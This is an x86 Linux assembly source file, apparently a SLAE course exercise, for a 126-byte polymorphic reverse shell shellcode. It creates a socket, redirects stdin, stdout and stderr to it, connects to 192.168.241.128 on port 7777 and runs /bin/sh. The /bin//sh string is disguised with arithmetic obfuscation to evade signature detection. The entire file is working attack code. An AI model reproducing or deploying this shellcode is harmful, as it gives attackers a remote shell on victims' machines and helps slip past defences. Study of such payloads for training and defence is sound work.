; Title: Polymorphic Linux x86 Reverse Shell Shellcode (126 bytes)
; Author: Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:
	; Socket creation and handling with socketcall()
        ; socketcall(int call, unsigned long *args)

        ; 1 - creating socket
        ; int socket(int domain, int type, int protocol)
        ; socketfd = socket(2, 1, 0)

        ; eax = 0x66 = socketcall()
        ; ebx = 0x1 = socket()
        ; ecx = ptr to socket's args

        xor ebx, ebx                    ; zero out ebx
        mul ebx                    	; implicit operand eax: zero out eax
        mov al, 0x33
	add al, 0x33                    ; 0x66 = 102 = socketcall()
        mov [esp-4], dword ebx		; push ebx, 3rd arg: socket protocol = 0
	sub esp, 0x4

	mov bl, 0x1                     ; ebx = 1 = socket() function
        push byte 0x1                   ; 2nd arg: socket type = 1 (SOCK_STREAM)
	push byte 0x2                   ; 1st arg: socket domain = 2 (AF_INET)
	mov ecx, esp                    ; copy stack structure's address to ecx (pointer)
        int 0x80                        ; eax = socket(AF_INET, SOCK_STREAM, 0)

	; 2 - dup2
        ; int dup2(int oldfd, int newfd)
        ; duplicate our socketfd into fd from 2 to 0  (stdin = 0, stdout = 1, stderror = 2)
        ; stdin/stdout/stderror become the TCP connection

	; eax = 0x3f = dup2()
        ; ebx = socketfd
        ; ecx = fd (from 2 to 0)

	;xchg eax, ebx			; ebx = socketfd, eax = 1
	mov ebx, eax
	mov al, 0x1
	pop ecx				; ecx = 2 (loop count)
	inc ecx
	pxor mm0, mm1
	dec ecx
dup_jump:
	mov al, 0x4f			; eax = 63 = dup2()
	sub al, 0x10
	int 0x80			; dup2(socketfd, ecx)
	inc ecx				; decrement ecx from stderror to stdin
	sub ecx, 0x2
	jns dup_jump			; loop until ZF is set

	; 3 - connect
	; int connect(int sockfd, const struct sockaddr *addr[sin_family, sin_port, sin_addr], socklen_t addrlen)
	; eax = connect(socketfd, [2, port, IP], 16)
	; returns 0 on success

	; eax = 0x66 = socketcall()
        ; ebx = 0x3 = connect()
        ; ecx = ptr to bind's args

        mov al, 0x33                    ; 0x66 = 102 = socketcall()
	add al, 0x33

	push dword 0x80f1a8c0          	; 192.168.241.128 Remote IP address
  	push word 0x611e                ; Remote port
        push word 0x0002                ; sin_family = 2 (AF_INET)
	;mov ecx, esp			; ecx = ptr to *addr structure
	xchg ecx, esp
	mov esp, ecx

	push byte 16                    ; addr_len = 16 (structure size)
	push ecx			; push ptr of args structure
	push ebx			; ebx = socketfd

        mov bl, 0x4                     ; ebx = 3 = connect()
        dec bl
	mov ecx, esp                    ; save esp into ecx, points to socketfd

	fldz
        int 0x80                        ; eax = connect(socketfd, *addr[2, 7777, IP], 16) = 0 (on success)



  	; 4 - execve /bin/sh
        ; execve(const char *filename, char *const argv[filename], char *const envp[])
        ; execve(/bin//sh, &/bin//sh, 0)

	; eax = 0xb = execve()
        ; ebx = *filename
        ; ecx = *argv
	; edx = *envp

	xor eax, eax
	push edx			; edx = 0x00000000

	;push dword 0x68732f2f           ; push //sh
        ;push dword 0x6e69622f           ; push /bin (=/bin//sh)
	mov ebx, 0x57621e1e
	add ebx, 0x11111110
	push ebx
	inc dword [esp]

	mov ebx, 0x4c47400c
	add ebx, 0x22222222
	push ebx
	inc dword [esp]

	mov ebx, esp                    ; ebx =  ptr to /bin//sh into ebx
        push edx                        ; edx = 0x00000000
	mov edx, esp			; edx = ptr to NULL address
	push ebx                        ; pointer to /bin//sh. Stack = 0X00, /bin//sh, 0X00000000, &/bin//sh
        mov ecx, esp                    ; ecx points to argv
        mov al, 0xb
        int 0x80                        ; execve /bin/sh

